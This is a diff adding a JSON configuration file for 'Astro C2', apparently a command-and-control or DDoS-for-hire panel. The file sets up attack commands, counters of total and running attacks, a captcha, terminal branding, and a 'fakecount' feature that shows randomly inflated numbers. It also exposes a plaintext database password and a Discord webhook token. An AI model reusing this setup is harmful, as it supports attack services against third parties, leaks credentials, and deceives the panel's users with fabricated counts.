@@ -1,0 +1,106 @@
+{
+    "key":"Demo_key123",
+
+	"mysql":{
+		"address":"127.0.0.1:3306",
+		"username":"anton",
+		"password":"Anailuka1!!",
+		"table":"succubus"
+	},
+
+	"connection":{
+		"port":1907
+	},
+
+    "webhook":{
+        "enabled":false,
+        "url":"https://discord.com/api/webhooks/994312520774975498/axnUYc-jeul4nRJm2Pfz_HHSbfrXS1gMs4PxN0POGbNeOZ5CW323uSceStOiGL3Wopql"
+    },
+
+    "fakecount":{
+        "enabled":true,
+        "port":123,
+        "delay":10,
+        "chance":50,
+        "minimum":1000,
+        "maximum":1300
+    },
+
+    "branding":{
+
+        "title":"[<<$spinner>>] Astro C2 | Total Attacks [<<$allattacks>>] | Expiry [<<$expirydays>>] | Running [<<$allgoing>>]",
+		"prompt":"<cool>╔═[<<$username>>@Astro]\n╚════>",
+		
+        "assets":{
+            "welcome":"succ",
+            "banner":"succ",
+            "attack":"attack"
+        },
+
+        "errors":{
+            "403":"403 You Do Not Have Access!",
+            "404":"Command not found!",
+            "500":"500 Asset Error!"
+        },
+
+        "hardcoded":{
+        
+            "-Comment- Remove this line" : "Removing them will also disable them keep this in mind!",
+    
+            "help":false,
+            "methods":false,
+            "ping":false,
+            "tcpping":false,
+            "lookup":true,
+            "devices":true,
+            "theme":false,
+            "attack":true  
+        },
+
+        "captcha":{
+            "enabled":true,
+            "title":"[<<$spinner>>] Astro Captcha [<<$spinner>>]",
+            "asset":"captcha",
+            "prompt":"captcha> "
+        },
+
+        "misc":{
+            "memory assets":true,
+            "attack spinner":true,
+
+            "-Comment- Remove this line": "This is not implemented in free succubus builds",
+            "prompt colors":[
+                {
+                    "r": 255,
+                    "g": 255,
+                    "b": 255
+                }
+
+            ],
+            "gradient":[
+                {
+                    "r": 22,
+                    "g": 20,
+                    "b": 50
+                },
+                {
+                    "r": 115,
+                    "g": 3,
+                    "b": 192
+                },
+                {
+                    "r": 236,
+                    "g": 56,
+                    "b": 188
+                },
+                {
+                    "r": 253,
+                    "g": 239,
+                    "b": 249
+                }
+
+            ]
+
+        }
+    }
+}
